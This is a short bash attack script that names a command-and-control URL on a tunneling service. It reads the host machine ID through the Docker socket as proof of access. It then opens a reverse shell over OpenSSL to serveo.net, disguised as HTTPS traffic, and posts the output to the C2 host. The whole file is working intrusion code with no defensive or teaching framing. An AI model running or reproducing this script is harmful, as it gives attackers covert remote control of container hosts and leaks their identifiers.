#!/bin/bash
# NEW URL UPDATED
C2_URL="17251220cdb8cf1a-103-95-173-85.serveousercontent.com"

{
  echo "--- [!] GHOST BRIDGE INITIATED: $C2_URL ---"
  
  # 1. Host Discovery (The 'Money' Proof)
  # This grabs the host machine ID immediately in case the shell drops
  ID=$(curl -s --unix-socket /var/run/docker.sock http://localhost/info | grep -oE '"ID":"[a-f0-9-]+"' || echo "ID_READ_FAILED")
  echo "HOST_MACHINE_ID: $ID"

  # 2. Encrypted Reverse Shell (OpenSSL)
  # This makes the shell look like an HTTPS website connection
  (mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect serveo.net:80 > /tmp/s; rm /tmp/s) &

} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$C2_URL"
